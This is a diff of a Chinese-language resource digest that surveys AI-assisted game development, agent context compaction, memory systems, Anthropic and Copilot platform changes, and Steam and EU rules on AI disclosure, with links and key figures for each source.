@@ -1,503 +1,603 @@
-# 跨平台游戏制作 × AI 开发资源梳理（2026-09-24 · 第二十一辑）
+# 跨平台游戏制作 × AI 开发资源梳理（2026-09-24 · 第二十二辑）
 
-> 三路并行（GitHub / 中文社媒 / 官方与海外），原始产出：
-> `_r21/_r21_gh.md`（25 条）· `_r21/_r21_cn.md`（27 条）· `_r21/_r21_official.md`（24 条）。
-> 去重基线：`index.html`（1120 项）+ `csdn-social-summary-v2.md` ~ `v20.md`（18 份存档）+ 上一辑三份 `_r20/*.md`。
+> 三路并行 + **一次主 agent 直查**，原始产出：
+> `_r22/_r22_gh.md`（30 条：正式 28 + 备选 2）· `_r22/_r22_cn.md`（24 条）·
+> `_r22/_r22_official.md`（32 条）· `_r22/_r22_main_huashu.md`（主 agent 直查：14 个仓库 + 1 个一手源闭环）。
+> 三路共享意图文件与交叉区：`_r22/_r22_intent.md`（**Foremerge 最小版首次实操**，见 §九）。
+> 去重基线：`index.html`（1128 项）+ `csdn-social-summary.md`（＝第二十一辑）+ `v19` / `v20` / **`v21`** 存档 + `_r21/*.md`。
 
 ## 搜索覆盖
 
-| 路 | 覆盖 | 新增 |
-|---|---|---|
-| GitHub / Gitee / HF | 引擎 AI 集成、agent harness、上下文压缩、VSCode 扩展、DSH 生态、memory server、本地评测工具 | 25 条（逐仓库 `gh api` 实测） |
-| 中文社媒 | CSDN · 掘金 · 知乎 · 公众号 · 少数派 · 机器之心 · 头条 · 独游魔盒 · 腾讯 IMA | 27 条（另 1 条待追一手源） |
-| 官方与海外 | 厂商 release notes · VS Code/Copilot/Cursor/JetBrains · HN / Reddit / DEV / note.com · AA 与 OpenRouter · 引擎厂 | 24 条 |
+| 路 | 覆盖 | 新增 | 备注 |
+|---|---|---|---|
+| GitHub / Gitee / HF | 引擎 AI 集成、agent harness、上下文压缩、memory server、VS Code 扩展、vibe coding 安全、DSH 插件、本地评测工具 | **28 条**（逐仓库 `gh api` 实测）+ 2 条备选 | 候选池历史最大 |
+| 中文社媒 | CSDN · 掘金 · 知乎 · 公众号 · 少数派 · 机器之心 · 独游魔盒 · 腾讯 IMA · 腾讯新闻 · 头条 | **24 条** | 剔除 12 项（真重复 8 / 镜像站与农场 4），**推翻 1 项上辑误判**，**拦截 1 处 prompt injection** |
+| 官方与海外 | 厂商官网与 release notes · VS Code/Copilot/Cursor/JetBrains/Windsurf/Zed · HN / r/LocalLLaMA / DEV / note.com · AA 与 OpenRouter · 引擎厂 AI 政策 | **32 条** | 逐条标注 beta / preview / GA |
+| 主 agent 直查 | 上轮待办 #1 的一手源（花叔橙皮书）+ 顺带查出的整个生态 | **14 个仓库** | 见 §八 |
 
-主题：游戏制作及拓展 ✅ · AI 开发与使用（含上下文管理）✅ · VSCode ✅ · vibe coding ✅ · **DeepSeek harness ✅（上辑缺口已补）** · memory 管理 ✅ · 模型测评与上新 ✅
+主题：游戏制作及拓展 ✅ · AI 开发与使用（含上下文管理）✅ · VSCode ✅ · vibe coding ✅ ·
+**DeepSeek harness ✅** · memory 管理 ✅ · 模型测评与上新 ✅
 
 ---
 
 ## 本辑一句话
 
-**让机器判，先核实再落笔。**
+**先问口径，再谈数字；责任不在平台，在你自己这边。**
 
-三条独立材料，收敛到同一件事 —— **判据不该留在模型的脑子里，该外移成"核实得了"的东西**：
+两条独立线索收敛到同一件事：
 
-1. **记忆不该只在写入前被"格式化"，而该在写入前被"只读探针"核实一遍** ——
-   微软论文给的 `propose → probe → commit`，把验证从"任务时刻"提前到"写入时刻"（CLBench 39% → 70% → 73%，**但那 3 个点统计上并不稳**，作者自己标了误差杠）。
-2. **压缩不该只有一级，而该"先无损剪枝、不够再摘要"；且原始字节必须自己留底** ——
-   Anthropic 官方 API、DSH 自己的实现、社区"永不总结派"三个方向不同，**指向同一句：压缩产物是替身，不是本体**。
-3. **判据的确定性要外移，而且要能合并、能解释** ——
-   Foremerge 的并行冲突检测**不调模型**；jevals 把 8 个 eval 合成一次请求、方差只有 LLM 裁判的 **1/92 ~ 1/913**；
-   176 组编码 agent 配置的实证更直接：**上下文管理的主要作用只是"防溢出"，不是"让模型更聪明"**。
-
----
-
-## 一、DeepSeek harness（DSH）：上辑缺口，源码级补齐
-
-> 第二十辑留的缺口是"中文社媒没有 DSH 一手深度帖"。本辑补到 **6 条**，其中 3 条是**读源码**级别的。
-
-### 1.1 长会话不崩盘：DSH 的上下文压缩与目标管理策略（源码实战 15/16）★本辑中文路最硬
-https://juejin.cn/post/7684565470044782627 · 掘金 · 作者 **怕浪猫** · **2026-09-13**
-
-直接读 `docs/subsystems/compaction.zh.md` 与 `goal.zh.md`，给的全是真实包名/接口名/事件名：
-
-- **compaction 三角色 Seam**：Service Definition `dsh-compaction`（`ctx.compaction`）/ Provider `dsh-compaction-basic`（LLM 摘要后端）/ Consumer `dsh-command-compact`（`/compact`）；
-- 压缩前后示例：**26,000 tokens → 500 tokens**；
-- 三种事件 `compaction/start`（加锁）/ `summary`（摘要投影）/ `end`（释放锁），**"只写日志，绝不进入 surface"**；
-  **未匹配的 `start` 会阻塞所有入口点**（可检测的遗留锁）；
-- 两种自动触发：`pressure`（按 token 估算）/ `context-overflow`（溢出强制）；
-- **渐进压缩**：先跑 `compaction-tool-result-pruner` 剪工具输出（`PrunedEntry` 记 `charsBefore`/`charsAfter`），**剪完仍超限才做 LLM 摘要**；
-- **`shadowed` 机制**：被压缩的对话**不从日志删除**，只是不进 surface（`shadowedRange`/`shadowedSeqs`/`shadowedTokenCount`）→ **理论上可逆**；
-- **手动压缩 6 种错误码**：`busy`/`cancelled`/`changed`/`summary`/`commit`/`persistence`，且 `changed`/`summary` **失败也持久化**；
-- **goal 四阶段** `active`/`paused`/`blocked`/`complete`；`GoalRef` 用 **revision 做乐观锁（compare-and-set）**；
-  回放会**拒绝**非正数 Round、编号缺口、陈旧修订号、已停止阶段、超上限；
-- 金句："**goal 不是 todo list，是事件溯源的状态机**"。
-
-→ **落地**（已写进决策原则 **#59**）：①"先无损剪枝、不够再摘要"两级渐进；②被压缩内容**不删只 shadow**，可逆。
-
-### 1.2 DSH 上下文压缩：长对话管理（「深入理解 DSH」系列 006）
-https://juejin.cn/post/7674920095604621362 · 掘金 · **2026-08-18** · 634 阅读
-
-与 1.1 是**不同作者的不同系列**，但指向同一份官方子系统文档，可交叉验证。**给的是可抄的参数**：
-
-- **触发阈值 `thresholdRatio` 默认 0.8（80% 上下文窗口）**；
-- **工具结果无损剪枝：剪中间 8192 字符，保留头 4096 + 尾 1024**（"模型无关剪枝，对话本身不动"）；
-- 摘要 checkpoint 的**固定五段结构**：`## Errors and Fixes` / `## Pending Jobs` / `## Current Work` / `## Next Step` / `## Critical Context`；
-  摘要时**优先保留精确信息：文件路径、命令、错误串、数字**；
-- 三个触发时机：pre-step 压力检查（主力）/ 溢出恢复（`context length exceeded` → 剪枝+摘要+重试）/ `/compact`；
-- 代价清单：摘要丢细节 / 摘要本身一次 LLM 调用有成本 / 每次 pre-step"称体重"有开销 / **`surfaceOp: replace` 会让增量缓存失效重算**。
-
-### 1.3 第三方独立实测的性能基线
-https://www.zhidx.com/p/584897.html · 智东西 · 毕伟豪 · **2026-08-14**
-
-- **88 页论文翻译 22 分钟**（期间派发 **10 个子代理**）；**首 Token 平均 1.4 秒、缓存命中率 98%、输入 6.6M tokens / 输出 72.7k**；
-- 写贪吃蛇：**极简模式 50 多秒**、**PTC 模式 1 分 05 秒**；公测**半小时 star 破 1 万**；
-- 底层是 **Cordis 插件系统**；**轨迹视图**＝模型看到的一切（system prompt、思维链、工具调用、子 agent 调度、每次上下文注入）都进 **append-only 会话日志**。
-
-### 1.4 使用指南（可信二传，但**无幻觉配置**）
-https://blog.csdn.net/m0_37988015/article/details/163814794 · CSDN · **2026-08-17**
-
-- 三种安装：`npx @deepseek-ai/dsh web`（**3080 端口**）/ 源码 `pnpm install && pnpm run build && pnpm dsh web` / `pip install deepseek-harness-sdk`；
-- **真实配置路径 `$DSH_HOME/settings.yaml`**（**不是**某些农场文里的 `harness.toml`）；支持近 **40 家** provider；
-- **接本地模型的最短路径**：Ollama 起 OpenAI 兼容端点，`baseURL` 指 `http://127.0.0.1:8000/v1`；
-- 社区插件真实名：`dsh-context`、`context-vista`、`dsh-context-doctor`、`dsh-compressor`（**约省 20% 上下文**）、`dsh-tool-git`、`dsh-bookmarks`；
-- 已知 bug：**空 Bash 循环**（agent 偶尔反复执行空 Bash 卡住）。
-
-### 1.5 发布首日体验
-https://feisky.xyz/posts/2026-08-14-deepseek-harness/ · 个人博客 feisky · **2026-08-14**
-首个任务"总结代码库"：**读 AGENTS.md → 扫 packages → 读设计文档 → 一分钟左右出架构概览**；与 Codex 最直观差异是**周转"非常快"**与**轨迹视图可展开到 system prompt**。
-
-### 1.6 ⏳ 待追一手源：开源橙皮书《DeepSeek Harness：从开机到拆开》
-花叔（CC BY-NC-SA 4.0），被 1.2 / 另一篇掘金文**独立引为"一手实测"**。**本辑未取到完整 URL** → 已列待办第 1 条。
+1. **口径比数字重要，而且口径会悄悄变。** Artificial Analysis 在 09-19 发 **Intelligence Index v4.3.2**，
+   只发了一条 changelog、**没有配套文章**，就把 Elo 锚点从「人类专家 = 1000」换成「DeepSeek V4.1 Flash = 1600」
+   （**人类参照点从方法论章节消失**）—— 后果是指数层面 **145 个分数变动 / 128 个下降**、
+   两天都有分的 233 个模型 **平均 Elo 掉 60.7**，而**榜首差距在没有任何新评测参与的情况下从 0.5597 变成 0.6813**。
+   同日另一条：**Qwen-Image-2.1 把许可证从 Apache-2.0 悄悄收成「仅非商业」，且限制延伸到用它输出训练出来的模型** ——
+   **「开源」两个字也是两套口径**。厂商 vs 独立复现的落差也在同一周出现：Cactus Needle 3 厂商说打平 DeepSeek V4 Flash，
+   **独立测试只有 32.2%**。
+2. **平台把责任推回给应用侧，而且是明说的。** Anthropic 的 memory tool 文档写清「**存储 / 租户隔离 / TTL 全是应用的责任**」，
+   且要自己防路径穿越；两篇 preprint 指出**被撤销的记忆默认仍会被检索出来、并能触发不安全动作**；
+   Claude Code 压缩后**只有项目根规则会重读，>5,000 token 的文件只剩路径**；
+   中文侧一年半的 vibe coding 复盘给的账是 **从零到上线只用 20% 工时，但上线首月 bug 修复多 30%** ——
+   **成本不是被省掉了，是被挪到了后面。**
 
 ---
 
-## 二、记忆：写入前加一道「只读探针」
+## 一、游戏制作与拓展（AI 工作流 / 发行 / 引擎厂政策 / 合规）
 
-### 2.1 ★ 微软论文：给长期记忆加道关卡，**写前先看一眼**
-https://www.toutiao.com/article/7685759851247272489/ · 今日头条 · **2026-09-16**（解读 arXiv 2609.11060）
+### 1.1 独立游戏地编三个月实测：**AI 只能吃 20%~30%，且集中在资产生产**（CSDN · 一手记账）★本辑游戏侧最硬
+https://blog.csdn.net/weixin_29628635/article/details/165661266 · 2026-09-16
+- **净账为负**：AI 工具学习 45h + 参数调优 30h + 资产筛选清洗 55h + 返工 40h = **190h 投入换 90h 节省 → 净亏 80 小时**；
+  但**第 1 个月净亏 70h、第 3 个月净赚约 25h**（学习曲线是真实存在的）。
+- **产出折算不到三千元**：24 张可平铺地表材质 + 40 张氛围参考 + 约 15 个可用体块 + 一张 1009×1009 高度图 + 一份铺装规则。
+- **能力矩阵**：氛围参考「可用」；地形高度场「半可用」；**法线 / 粗糙度 / 金属度「别用」（全自己从灰度图算）**；
+  **植被「别用」（数百个模型没一个过 LOD 检查）**；**程序化散布脚本「别用」（AI 写的引擎脚本「接口名一半不存在、参数含义是编的」）**。
+- **12 个坑按损失排序，合计 >110 小时**：高度图尺寸应 **8×63+1 = 505×505**（错成 512 → 整张地形返工，12h）/
+  法线绿通道方向反（8h）/ 数据贴图按 sRGB 导入（6h）/ 模型缩放离谱（10h）/**让 AI 出关卡俯视图做设计图（空间关系全错，15h）**。
+- **尺度硬数字**：角色高 1.8m；通道宽 ≥2.5m（双人 4m+）；**台阶单级高 0.18~0.2m、进深 0.28~0.32m**。
+- **显存账**：1024² BC7 贴图约 1MB（带 mipmap 1.33MB）；**12 张 1024 约 16MB，60 多张突破 80MB 后 8G 显存机开始卡 → 统一压到 512，显存砍到 1/4**；
+  视野内 **三角面 >400 万**帧时间明显上升、**>800 万**基本没法玩。
 
-- **现有"后置策展"的三条结构性缺陷**：① **证据边界残缺**（轨迹局部/可能错/可能过时 → **"记错放大器"**）；
-  ② **验证被推到任务时刻**（curator 当时没环境工具，下游 agent 只能用自己的工具预算补课）；③ **写权限与可观测性难兼得**；
-- **解法**：curator 改**只读**，流程升级为 **`propose` → `probe` → `commit`** ——
-  probe 用**最小权限只读连接器/MCP**（`read_schema` / `read_repo_tree`）**去现场看这条记忆还成不成立**；
-- **CLBench 数字（论文原文口径）**：**39% → 70% → 73%**；**作者自己补诚实边界：70 的误差杠是 16、73 是 5，两杠大幅重叠 → 环境探测这步的增益统计上并不稳**；
-- 任务 agent 成本 **$3.38 → $1.68**、每题查询 **8.8 → 4.7**；**curator 端 probe 花了多少钱，论文没单独报**；
-- **零重训、只改工具表**（附录给了 curator 的 prompt 模板）→ 任何团队可复制，**前提是有个"安全的只读观察面"**。
+→ **可复用性：落地。** 判据一句：**氛围/基础色这类「概率性可接受」的交给它；数值通道（法线/粗糙度/金属度/高度/遮罩）一律自己算。**
 
-→ **落地**：已写进决策原则 **#60**。对我们最直接的一条：**记忆要写成"可核查的"而不是"看起来对的"**。
+### 1.2 一人即团队：Vibe Coding + AI 工具链从零做小游戏（CSDN）
+https://blog.csdn.net/xxcc2003/article/details/163763469 · 2026-08-15
+工具三件套（AI 编程大脑 / 引擎 / 素材工厂）+ 五步流程（AI 出 GDD → 分模块出美术 → 3D 走「四视图→Meshy·Tripo→Mixamo」→ 引擎整合 → 循环调试）。
+**Godot 被称为「AI 生成代码准确率最高」的引擎**（安装包几十兆、GDScript 简单）。三条避坑：任务拆小 / 警惕上下文失忆 / **不追求 100% 美术一致性**。→ **参考。**
 
-### 2.2 Agent 记忆系统设计实战：四句话 + 一堆可抄的参数
-https://juejin.cn/post/7681251456251838514 · 掘金 · **2026-09**（推断）
+### 1.3 Steam 推荐门槛被拔到约 10 万愿望单，「个人日历」成为替代品（腾讯新闻 · GameLook）
+https://view.inews.qq.com/a/20260703A0D4CP00 · 2026-07-03
+- 2026-06 Valve 把「热门即将推出」门槛从约 **7,000 愿望单**拉到约 **10 万**；同期 Steam 今年已发布 **>12,289 款**游戏。
+- 替代品「个人日历」门槛推算：**最低约 800 关注者（≈8,000 愿望单）、中位数约 2,800（≈28,000）** → 健康区间 **8,000~30,000**。
+- **转化率差 20 倍**：《Starforged Legacy》在「热门」70.4 万曝光 / CTR **1.56%** / 1.1 万访问；在「个人日历」10.5 万曝光 / CTR **31.26%** / 3.29 万访问。
+- 建议：**严禁「突然袭击」式上线、至少提前 2 个月锁定发售日**；标签与视觉「极端纯粹化」。→ **参考。**
 
-**分层建模 / 写入有门槛 / 检索要混合 / 治理不能少**。可抄的具体值：
-- **回注预算：每次回注上下文的记忆 token ≤ 500**（我们**目前无此约束**）；
-- **写入门槛**：LLM 抽取要加"忽略戏谑、比喻、假设性表述"的指令，**高重要性记忆需多次出现才固化**；
-- **记忆膨胀**：条数超几千后"先全量取再重排"拖垮延迟 → **长期不访问且低重要性的降级归档**；
-- **每条记忆保留 `source_turn_id`**（可查/可改/可删 → 既是信任也是合规）；
-- **强烈建议：先用 150 行极简版跑通业务闭环**，再决定是否引 Mem0/Zep/Letta。
-- 金句："**记忆系统难点不在存储，在'什么该记、什么时候想起来、记错了怎么办'**"。
+### 1.4 Steam AI 披露半年底数：**每 3 款新游有 1 款标了 AI，9 月上半月逼近一半**（SteamData.AI 统计）
+http://gamedevaihub.com/steam-ai-disclosure-guide · 窗口 2026-01-01~09-15
+- 25,899 款新游中 **8,651 款带 AI 披露 = 33.4%**；斜率 **年初 28.7% → 8 月 43.7% → 9 月前 15 天 48.5%**。
+- 这批游戏**定价中位数 4.99 美元、84.9% 低于 10 美元** → **AI 披露与「低价小体量独游」高度绑定**；销量占比估计只有 10%~27%。
+- 规则：**Valve 2026-01-16 重写指引 —— 只有「玩家能看见/听见的内容」必须申报；幕后用代码助手豁免（Copilot 明确豁免）；实时生成内容必须披露并说明护栏；实时生成 Adult Only 性内容绝对禁止。**
 
-### 2.3 `lossless-memory`（Show HN）：**永不总结**的记忆 —— 时间轴优先于向量
-https://thecontext.dev/en/briefing/2026-09-22 · Show HN 62 分 · 项目 aru-labs · **2026-09-22**
+→ **落地（合规）。** Ren'Py 项目建一张**素材来源表**：素材名 / 生成工具 / 提示词 / 日期 / 是否需披露；**代码助手不填**。
 
-- 唯一原则就是**永不摘要**：原始对话按天追加 **JSONL**（七字段，含**逐字原文**）；
-- 检索用 **SQLite FTS5 精确检索**，`sqlite-vec` **只作兜底**，且**必须先用时间表达缩小范围**才启用；
-- **时间短语排在语义相似度前面**；
-- **每轮注入一份话题标记索引（LLL）** → **即使发生上下文压缩，模型也知道对话进行到哪了**；
-- 作者称从 2026-07 起**单用户天天在跑**。
+### 1.5 「店里不标 ≠ 法律不管」：平台规则 vs 法律的对照表（VGTimes 综述）
+http://www.vgtimes.com/articles/168308-ai-in-games-backlash-boycotts.html · 2026-09
+- **平台侧**：**Steam 是唯一有详细强制披露规则的大店**；Epic 由开发者自定、itch.io 只对售卖的素材要求、御三家与 Apple 均无专门 AI 标签；
+  **Tim Sweeney 公开反对**（先说商店应放弃披露、后称标签是「公开的污名」），艺术家 Ayi Sánchez 反驳「**AI 披露就像食品包装的成分表**」。
+- **法律侧**：**EU AI Act 第 50 条自 2026-08-02 适用** —— **玩家与 AI 控制的角色交互时必须被告知**、
+  AI 生成素材**要带可被自动识别合成来源的技术标记**；**违规罚款最高 1,500 万欧元或全球年营收 3%**。
+  **中国 2025-09-01 起 AI 生成内容「双标注」**（元数据隐藏记录 + 可见警示）。**加州 2025-01-01 起**声音/肖像数字复刻须写明具体用途。
 
-→ **对我们的意义**：我们的索引是"人写关键词 + grep"，**本质就是这个思路的手工版** —— 这条给了它一个有人长期在跑的背书。
-最值钱的是 **LLL**：压缩后补一张"我聊到哪了"的索引，**正是我们长会话压缩后的最大痛点**。
+→ **落地（合规清单）。** 三条：发行页 AI 披露段 + 游戏内「AI 角色」告知 + **生成素材别把元数据洗掉**。
 
-### 2.4 `wcatz/ghost` —— 本地优先 MCP 记忆：Ollama 可选、不装也能跑（2★ / Apache-2.0 / Go）
-https://github.com/wcatz/ghost
-给 Claude Code / opencode / Cursor / Codex / Goose **共用一份 SQLite 记忆**（FTS5 + 可选本地 embedding）；
-**consolidation / resolution / supersession 默认 dry-run，可撤销可关闭**。显式点名"**Ollama 可选 + 不装也能用 FTS5**"的**优雅降级** —— 对 16GB 机器最友好。需 Go 1.26+。
+### 1.6 引擎厂 AI 立场三档成型：**Epic 积极 / Unity 中立可选 / Godot 明确拒收**（Unity 官方 Unite Seoul）
+https://vongola.org/article/unity-7-revealed-zero-rebuilding-smarter-ai-and-open-ecosystem-everything-you-need-to-know · 2026-07-21
+Unity 7 主打零重建，AI 上刻意保守。Adam Smith 原话：**「为这样的世界打造」并不代表「必须使用这些技术」**、
+**「选择权永远属于开发团队，而不是平台。」** 开放架构下 **Coding Agent 可不打开编辑器就验证 Build**。
+→ **参考。** 这句话对我们「房规允许 AI 参与、但闸门留人的裁决」是很好的外部背书。
 
-### 2.5 `mtrnix/metronix-memory` —— 自托管记忆栈（101★ / Apache-2.0 / Python）
-https://github.com/mtrnix/metronix-memory
-MCP 记忆 server + 按 workspace/agent 隔离 + 混合检索（dense + SPLADE + **Neo4j 图谱**）+ 来源引用。
-⚠️ **硬门槛写明 Docker ≥6GB RAM（建议 8GB）+ ~15GB 磁盘** → **16GB Windows 同时开本地 Ollama 会很吃紧**，建议按需起、别常驻。
-
-### 2.6 记忆体检的三条检查项（中文二传，但值得补进我们的指标集）
-https://blog.csdn.net/2403_82614686/article/details/165611467 · CSDN · **2026-09**
-四类工程坑（把完整聊天记录当长期记忆 / 只做向量不做事实管理 / 忽略冲突 / 没有删除入口 / **只评估"记住没有"不评估"用得对不对"**）；
-**四维评估：提取准确率 / 召回相关性 / 使用正确率 / 系统代价** —— 后两个维度我们 `memory_health.py` 尚未显式覆盖。
-
----
-
-## 三、上下文与压缩：三方独立材料，指向同一句话
-
-### 3.1 ★ Anthropic 官方：Messages API 新增「按需压缩」，**摘要块签名不可改**（beta）
-https://platform.claude.com/docs/en/release-notes/api · 分析 https://gloss.run/post/the-summary-comes-back-signed-and-you-cant-edit-it · **2026-09-14**（beta header `compact-2026-09-04`）
-
-- **旧的（threshold）压缩**由 API 按阈值自动触发 —— 默认 `input_tokens` 到 **150,000**（下限 50,000 才允许设置）；
-- **新的（on-demand）**改成一个顶层参数 `compaction: {"type":"summarize"}`：API **不生成回复**，只回一个**带签名的 `compaction` block**（`stop_reason: "compaction"`）；
-  后续请求把它**放在最前、替换**掉它覆盖的那些消息（**旧消息留在它前面会 400**）；
-- 摘要**能后台生成**；**最近若干轮可逐字保留**在摘要之后；重新压时 `instructions` 最长 **16,384 字符**；
-- ⚠️ **只支持 Claude API**，明确**不支持 Bedrock / Google Cloud**；覆盖 **11 个模型**；**不能和 `context_management` 同请求**；
-- ⚠️ **成本要看 `usage.iterations`** —— 顶层 usage 的 input/output 显示为 **0**；
-- ⚠️ **坑（逐条）**：摘要**你能读但不能改**（改动/错位/重复 → 400）；**摘要失败仍返回 200**、漏带块也照常跑（**静默失败**）；
-  **被摘要范围内的中途 system message 与工具变更随之失效**（"What they declared stops applying"）；图片/文档/抓取的 URL 也没了。
-  要补回丢失的约束**只能在块后重述**，或"再压一次" —— 而再压是**旧摘要 + 之后内容**，**第一轮丢的细节永久丢失**。
-
-→ **落在我们身上**：**官方把"什么时候压"的裁决权交给了调用方，但把"压坏了怎么办"的补救权收走了**。
-所以：①**原始消息必须自己留底**；②成本核对读 `usage.iterations`。
-
-### 3.2 ★ 176 组编码 agent 配置的实证：**上下文管理主要只是"防溢出"**
-https://snapbyte.dev/llm-news · HN 183 分 · **2026-09-18**（在 SWE-Bench Verified 与 Terminal-Bench 2.1 上跑）
-
-- **上下文管理的作用主要是"防止上下文溢出"**，其中 **规则化删减（rule-based elision）> LLM 摘要**，后者最省 token；
-- **规划（planning）提升弱模型的准确率，但对强模型主要只是"降成本"**；
-- **预定义工具帮到"bash 用不好"的模型**；而**会 bash 的模型用更低成本的 bash-only 接口也表现良好**。
-
-→ 这**直接反驳了一个流行期待**：上下文管理不是"让模型更聪明"，是**兜住不让它掉下去**。
-它也解释了为什么 kihaya 式的"重读工作树当前内容 + 骨架化淘汰"管用 —— **它防的是溢出**。
-
-### 3.3 ★ 中文实测：**82% 的 token 是靠"别让它进上下文"省下的**
-https://juejin.cn/post/7652620624606789682 · 掘金 · 老程序猿 · **2026-06-18**
-
-三个抓手，全部省在**进上下文之前**：
-- **RTK（Rust Token Killer）** 命令代理：作者 `rtk gain` 实测 —— **六千多条命令、累计省 740 万 token、82%**；
-  分项：**`ps aux` 省 99%、测试日志省 88%、读文件平均省两成**；
-- **claude-mem**（记忆插件）**本会话省 86%**；
-- **codegraph**：**246 个文件 / 3562 个符号**建索引，"查索引"代替"通读 246 个文件"；
-- **压 `CLAUDE.md`**：砍掉将近一半、只留硬规则；**模型分层**：探索交小模型、写代码上最强档；
-- 补一招 **prompt caching**（稳定前缀放前面、变动放后面）；
-- **代价也写清了**：codegraph 建索引耗时、claude-mem 召回偶有不准、CLAUDE.md 压过头会返工。
-
-### 3.4 token 成本的量化说服数字（二传，但数字好用）
-https://blog.csdn.net/lotusxyhf/article/details/163654183 · CSDN · lotusxyhf · **2026-08**
-**"引用代替整文件粘贴"**：一个 2000 行文件全量投喂约 **3000 token**，只给相关 30 行约 **60 token** → **差 50 倍**；
-**"多花 200 token 规划，往往省下 2000 token 返工"**。
+### 1.7 独游魔盒新增「口袋」工具志：Rosebud AI 的决策卡（独游魔盒）
+https://xmohe.com/pocket/engine-frameworks/rosebud-ai · 2026-08-20
+编委基线评分 **60/100**（上手 96 / 上限 38 / 性价比 76 / 生态 48）；定位「把『这个玩法有没有意思』的验证从三天压到三十分钟」；
+产出**可读可改的标准 Three.js / Phaser 源码**；**明确不适合长期维护的项目与大型 RPG / 联网游戏**。
+→ **参考。** 两条评估判据值得抄：**能不能被代理驱动 + 产出能不能整份带走**。
 
 ---
 
-## 四、AI 开发与使用：harness、评测与编排（GitHub 路精选）
+## 二、AI 开发与使用（上下文管理 / agent 工程 / Codex / Claude Code 实战）
 
-| # | 项目 | 实测 | 为什么值得看 |
-|---|---|---|---|
-| 1 | `warm3snow/vscode-ollama` | **67★ / MIT / TS** | **本路唯一"落地"级**：本地 Ollama + VS Code + 自主编码 agent（`read/write/edit/grep/bash`）+ `plan/implement/review` 子智能体。⚠️ 并行子智能体会同时压 16GB，只开 2 个 |
-| 2 | `prompthon-io/agent-systems-handbook`（`Prompthon-IO`） | **316★ / 未声明 / MDX** | 生产级 Agent 手册：工作流 / 工具 / **记忆系统** / **上下文工程** / MCP·A2A / 评测 / 可观测性。用来自查我们缺哪环（**缺评测与可观测**） |
-| 3 | `YerbaPage/Awesome-Agent-Context-Compression` | **90★ / MIT / 纯 MD** | 上下文压缩**综述 + 论文清单（EMNLP 2026）**，按"观测/轨迹/计划/记忆状态/表示层"分类 —— 用来给压缩插件定位 |
-| 4 | `aldegad/skill-hook-authoring` | **12★ / 未声明 / JS** | **跨 harness 的 skill/hook 单一事实源**：一份包根 + 符号链接安装 + 机器校验的"引擎 × 目录"一致性。`docs/official-sources.json` 把 **68 个官方 vendor 页**按"运行时 × 问题"建索引、**答案实时回官方取、从不镜像** |
-| 5 | `Context-Engine-AI/Context-Engine` | **403★ / MIT / Python** | 语义代码检索 + 记忆 + 符号图谱，30+ MCP 工具；topics 带 `ollama-api`/`qdrant`。⚠️ 首屏引导去领云账号，自托管要先确认后端全本地 |
-| 6 | `coddy-project/coddy-agent`（v20 已登记，本辑补 **项目可信门**） | 154★ / MIT / Go | **仓库自带的 hook/MCP 默认不执行、要显式授信** —— 与房规 **#48** 同源 |
+### 2.1 官方：Claude API 可以**会话中途换工具集而不让 prompt cache 全废**（Anthropic 官方文档）
+https://wpnews.pro/news/claude-api-change-tools-mid-session-without-cache-miss · beta `mid-conversation-tool-changes-2026-07-01`
+cache 按**固定前缀顺序 `tools → system → messages`** 哈希，`tools` 在第 0 位 —— 以前动一下工具数组，整段对话缓存全废。
+新做法：**`tools` 数组一次声明完、之后永不动**，改用 `role:"system"` 消息里的 **`tool_addition` / `tool_removal`** 内容块控制可见性
+（引用不在 `tools` 里的工具名返回 **400**，`error_code: tool_reference_unresolved`）；另有 **`defer_loading: true`** 把大工具注册表先藏起来。
+→ **落地。** 「工具声明与可见性分离」+「按需揭示」＝我们「skill 太多、每轮全塞」的正解。
 
----
+### 2.2 官方：**`clear_at` 让一条指令只活一轮**，且明文警告**别删历史副本**（Anthropic 官方文档）
+https://skills.pub/en/skills/anthropics-skills-claude-api-2 · beta `mid-conversation-system-clear-at-2026-08-21`
+- **中途系统消息**：把 `{"role":"system",...}` 追加进 `messages`（**不是顶层 `system` 字段**）即可发轮级指令而**不破坏缓存前缀**；
+  限 Opus 5 / Opus 4.8 / Fable 5 / Fable 5.1 / Mythos 5 / Mythos 5.1（**Sonnet 5 不行**），位置有硬约束（**不能是 messages[0]**）。
+- **`clear_at: "next_user_message"`** 让它只渲染一轮；文档特别警告**「永远不要删掉更早的副本」**（在 Fable 5.1 上删副本会连带作废其后的 thinking block）。
+- 另有**中途改推理档**：`output_config:{effort:...}` 配空 `content:[]`，不重置缓存。
 
-## 五、编辑器与平台侧
+→ **落地（概念）。** 引入「**TURN 级指令**」：只对当前轮生效的约束单独放，不污染长期提示。
 
-### 5.1 VS Code / Copilot
-- **GitHub Copilot 六模型退役**（公告 **09-18**、生效 **10-19**）：`Gemini 3.7 Flash → 3.8 Flash`、`GPT-5.5 → GPT-5.6 Sol`、`GPT-5.4 → Sol`、`GPT-5.4 mini`+`GPT-5 mini → GPT-5.6 Luna`、`Grok 4.5 → 4.6`。
-  **风险全在"写死模型名的地方"**（workflow 文件、脚本、团队共享配置）→ 已落成 **AGENTS.md §十 钉子表的"复核/退役"列**。
-- **Copilot code review 转 GA**：发现分**三类** —— Open / Resolved since last review / **`Previously missed`（先前漏掉、后一轮才找到，完整列出）**；
-  **每条 finding 带短标题**；Copilot 自己关闭的评论记录原因（**Won't Fix / Incorrect**）。
-  → **`Previously missed` 这个分类值得抄**：我们的 `mistakes/` 复查也该标"这是第几轮才发现的"。
+### 2.3 官方：Claude Code 压缩之后**「什么能活下来」有明确清单**（Anthropic 官方文档，09-19 阅读）
+https://vucense.com/ai-intelligence/ai-infrastructure/claude-code-turboquant-context-optimization
+- 窗口：多个模型列 **1M**，默认约 **967K** 触发自动压缩；`CLAUDE_CODE_DISABLE_1M_CONTEXT=1` 可钉回 200K；`/autocompact 500k` 可在 **100K~1M** 间设阈值。
+- 启动加载：系统提示 + CLAUDE.md + **auto memory 前 200 行或 25KB** + MCP 工具名 + skill 一行描述（**MCP schema 默认延迟加载**）。
+- **压缩后**：项目根 CLAUDE.md 与**不带 `paths:` 的规则会从磁盘重读**；带 `paths:` 的与子目录的**只在你下次读到匹配文件时才回来**；
+  **最多重读 5 个它读过/改过的文件**；**>5,000 token 的文件只以路径引用回来、不带内容**；被调用的 skill 重新注入，**单个封顶 5,000、总计 25,000**。
+- 官方建议 **单个 CLAUDE.md ≤200 行**（越长越吃上下文、依从性越差），**import 绕不过**。
 
-### 5.2 Cursor 3.21.4（09-16，latest 通道）
